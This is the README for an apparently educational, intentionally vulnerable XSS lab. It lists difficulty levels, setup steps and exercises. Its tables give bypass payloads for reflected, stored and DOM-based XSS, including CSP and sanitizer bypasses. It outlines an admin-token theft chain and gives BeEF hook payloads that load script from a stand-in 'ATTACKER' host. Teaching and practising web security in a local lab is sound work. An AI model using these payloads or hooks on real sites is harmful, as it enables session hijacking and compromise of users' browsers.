# VulnLab - XSS Playground

> An intentionally vulnerable web application for learning Cross-Site Scripting (XSS) through hands-on practice — now with **5 difficulty levels** per vulnerability type and a **database reset button**.

**Author:** Cysec Don ([cysecdon@gmail.com](mailto:cysecdon@gmail.com))

---

## ⚠️ DISCLAIMER

**This application is INTENTIONALLY VULNERABLE.** It is designed for educational purposes only. DO NOT deploy this application on a public-facing server or any network accessible by unauthorized users. Running this application exposes your system to XSS attacks. Use only in isolated, local environments for security training and research.

By using this software, you accept full responsibility for any damage or misuse. The author is not liable for any illegal or unauthorized activities performed using this application.

---

## What's New

### 🎚️ 5 Difficulty Levels Per XSS Type

Every vulnerability type now has 5 progressive difficulty levels. Each level adds more defensive measures that you must bypass:

| Level | Name | What It Means |
|-------|------|---------------|
| **L1** | 😊 Easy | No filtering. Raw injection. Just type and win. |
| **L2** | 🤔 Medium | Basic keyword/tag blocking. Find an alternative injection vector. |
| **L3** | 😰 Hard | Multiple filters applied. Think outside the attribute. |
| **L4** | 🔥 Expert | Aggressive sanitization or context-switching. Exploit edge cases. |
| **L5** | 💀 Insane | Full CSP + strict sanitization. Only advanced bypasses work. |

### 🗑️ Database Reset Button

A **Reset Database** button is available in the navbar and on every page. Click it to clear all comments and reset profiles back to defaults. No more restarting the server to clear a persistent XSS payload!

---

## Quick Start

### Option 1: Docker (Recommended)

```bash
# Clone the repository
git clone https://github.com/cysec-don/XSS.git
cd XSS

# Build and run with Docker Compose
docker compose up -d

# The lab is now running at http://localhost:3001
```

To stop the lab:
```bash
docker compose down
```

### Option 2: Docker (Manual Build)

```bash
docker build -t vulnlab-xss .
docker run -d -p 3001:3001 --name vulnlab vulnlab-xss
```

### Option 3: Node.js (Local)

```bash
git clone https://github.com/cysec-don/XSS.git
cd XSS
npm install
npm start

# The lab is now running at http://localhost:3001
```

---

## Application Structure

```
XSS/
├── server.js              # Express server with vulnerable routes + level system
├── package.json           # Node.js project configuration
├── public/
│   └── css/
│       └── style.css      # Application stylesheet (dark theme + level UI)
├── Dockerfile             # Docker build configuration
├── docker-compose.yml     # Docker Compose for easy deployment
├── .dockerignore          # Docker build exclusions
├── .gitignore             # Git exclusions
└── README.md              # This file
```

---

## Difficulty Levels — Detailed Breakdown

### 🔍 Reflected XSS (Search Page)

| Level | Name | Defense | How to Bypass |
|-------|------|---------|---------------|
| L1 | 😊 Easy | No filtering | `<script>alert(1)</script>` — anything works |
| L2 | 🤔 Medium | "script" keyword blocked | `<img src=x onerror=alert(1)>` — use alternative tags |
| L3 | 😰 Hard | All `on*` event handlers stripped | `<a href="javascript:alert(1)">click</a>` or `<iframe srcdoc="...">` |
| L4 | 🔥 Expert | Angle brackets encoded in HTML; input also reflected in JS string | Break out of JS string: `';alert(1);//` (the JS context is vulnerable) |
| L5 | 💀 Insane | CSP (`script-src 'self'`) + angle brackets encoded + JS escaped | Use JSONP endpoint: `/api/callback?cb=alert//` loads and executes JS from same origin |

### 💬 Stored XSS (Comments Page)

| Level | Name | Defense (input-side) | How to Bypass |
|-------|------|---------------------|---------------|
| L1 | 😊 Easy | No sanitization | `<script>alert(1)</script>` — anything works |
| L2 | 🤔 Medium | `<script>` tags stripped | `<img src=x onerror=alert(1)>` — event handlers survive |
| L3 | 😰 Hard | `<script>` + `on*` handlers stripped | `<iframe srcdoc='<script>alert(1)</script>'>` — iframe with embedded HTML |
| L4 | 🔥 Expert | DOMPurify-lite (strips script, on*, iframe, form, base, javascript:) | `<svg onload=alert(1)>` — SVG slips through the lite sanitizer |
| L5 | 💀 Insane | Full DOMPurify + CSP header | Mutation XSS (mXSS) via namespace confusion, or script gadgets in the page's own JS |

### 🎯 DOM-Based XSS (Profile Page)

| Level | Name | Defense | How to Bypass |
|-------|------|---------|---------------|
| L1 | 😊 Easy | `innerHTML` with hash — no filter | `#<img src=x onerror=alert(1)>` — direct injection |
| L2 | 🤔 Medium | Script + `on*` stripped before `innerHTML` | `#<a href="javascript:alert(1)">click</a>` — javascript: URL survives |
| L3 | 😰 Hard | Angle brackets encoded, but SVG tags allowed through (bug) | `#<svg onload=alert(1)>` — SVG bypasses the broken sanitizer |
| L4 | 🔥 Expert | `textContent` used (safe), but `eval()` on hash starting with `calc:` | `#calc:alert(1)` — the calculator feature uses eval() |
| L5 | 💀 Insane | CSP + `textContent` + no eval + `postMessage` without origin check | Open the page from another origin and send `postMessage({type:'widget-data', content:'<img src=x onerror=alert(1)>'}, '*')` — the parent uses innerHTML on received messages |

---

## Vulnerable Pages

### 1. Search Page — Reflected XSS

**URL:** `http://localhost:3001/?level=1`

The search page reflects the `q` query parameter in the HTML response. Select a difficulty level to test your bypass skills.

**Quick test (L1):**
```
http://localhost:3001/?q=<script>alert(1)</script>&level=1
```

### 2. Comments Page — Stored XSS

**URL:** `http://localhost:3001/comments?level=1`

Post comments that persist and execute for every visitor. Higher levels strip more dangerous content on the server side before storing.

### 3. Profile Page — DOM-Based XSS

**URL:** `http://localhost:3001/profile/user1?level=1`

The profile page has client-side JavaScript that processes the URL hash fragment. Each level implements different client-side defenses.

### 4. Admin Dashboard — Privilege Escalation

**URL:** `http://localhost:3001/admin`

The admin dashboard displays user comments without encoding and contains a hidden admin secret token. Stored XSS payloads from any level will execute here.

### 5. JSONP Endpoint — CSP Bypass

**URL:** `http://localhost:3001/api/callback?cb=FUNCTION_NAME`

A JSONP endpoint served from the same origin. This is the key to bypassing CSP at L5 of Reflected XSS — the endpoint allows arbitrary callback function names.

---

## Lab Exercises

### Exercise 1: Reflected XSS — Easy to Insane

Work through all 5 levels of the search page:

| Level | Objective |
|-------|-----------|
| L1 | Pop an `alert(1)` using any payload |
| L2 | Bypass the "script" keyword filter to achieve XSS |
| L3 | Bypass the `on*` event handler filter |
| L4 | Break out of the JavaScript string context |
| L5 | Bypass CSP using the JSONP endpoint |

### Exercise 2: Stored XSS — Easy to Insane

Work through all 5 levels of the comments page:

| Level | Objective |
|-------|-----------|
| L1 | Store a `<script>` payload that executes for all visitors |
| L2 | Store a payload without using `<script>` tags |
| L3 | Store a payload without `<script>` or event handlers |
| L4 | Bypass DOMPurify-lite to achieve XSS |
| L5 | Bypass full DOMPurify + CSP (advanced: mXSS or script gadgets) |

### Exercise 3: DOM-Based XSS — Easy to Insane

Work through all 5 levels of the profile page:

| Level | Objective |
|-------|-----------|
| L1 | Inject HTML via the URL hash fragment |
| L2 | Bypass the client-side script + on* filter |
| L3 | Exploit the broken SVG sanitizer |
| L4 | Exploit the `eval()` calculator feature |
| L5 | Exploit the `postMessage` origin check bypass |

### Exercise 4: Full Chain — Account Takeover

Start with a Reflected XSS and chain it into full account takeover:

1. Use Reflected XSS to inject a payload that creates a Stored XSS in the comments
2. The stored payload waits for the admin to view the dashboard
3. When the admin views the dashboard, the payload steals the admin token
4. Use the admin token to access the admin API

### Exercise 5: BeEF Integration

Hook the VulnLab application using BeEF and demonstrate post-exploitation capabilities.

**Prerequisites:** Install and run [BeEF](https://beefproject.com/).

**BeEF Hook Payloads:**
```html
<!-- Via Reflected XSS -->
http://localhost:3001/?q=<script src="http://ATTACKER:3000/hook.js"></script>&level=1

<!-- Via Stored XSS (L1) -->
<script src="http://ATTACKER:3000/hook.js"></script>

<!-- Via Stored XSS (L2+ — no script tag) -->
<img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER:3000/hook.js';document.body.appendChild(s)">
```

---

## Database Reset

There are **three ways** to reset the database:

1. **Reset Button** — Click the 🗑️ button in the navbar (top right) or the "Reset Database" button on any page
2. **POST Request** — Send a POST request to `/reset`
   ```bash
   curl -X POST http://localhost:3001/reset
   ```
3. **Restart Server** — The in-memory data store resets on server restart

The reset clears:
- All stored comments
- Profile modifications (restored to defaults: Admin, Alice)

---

## Technical Details

### Default Ports

| Service | Port |
|---------|------|
| VulnLab | 3001 |
| BeEF (optional) | 3000 |

### Level System Implementation

The difficulty levels are implemented in two ways depending on the XSS type:

- **Reflected XSS:** Output-side filtering — the query parameter is processed differently based on the selected level before being embedded in the response
- **Stored XSS:** Input-side filtering — the comment content is sanitized at the time of POST based on the selected level, so the stored data varies by level
- **DOM-Based XSS:** Client-side filtering — the JavaScript on the page changes based on the level, implementing different source-to-sink processing

### Special Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/reset` | POST — Clear all data |
| `/api/callback?cb=FN` | JSONP endpoint for CSP bypass (Reflected L5) |
| `/dom-widget.html` | Widget iframe for postMessage exploitation (DOM L5) |
| `/api/search?q=...` | JSON search API |

---

## Troubleshooting

### Port already in use
```bash
PORT=8080 npm start
# Or for Docker:
docker run -d -p 8080:3001 --name vulnlab vulnlab-xss
```

### Level selector not appearing
Make sure you're accessing the page with `?level=1` through `?level=5`. The default is level 1.

### Stored XSS not working at higher levels
Higher levels apply server-side sanitization. Check the hint box on the page for bypass suggestions.

---

## License

MIT License — See [LICENSE](LICENSE) for details.

---

## Author

**Cysec Don**
Email: [cysecdon@gmail.com](mailto:cysecdon@gmail.com)
GitHub: [https://github.com/cysec-don](https://github.com/cysec-don)

---

*Remember: With great power comes great responsibility. Use your skills ethically and legally.*
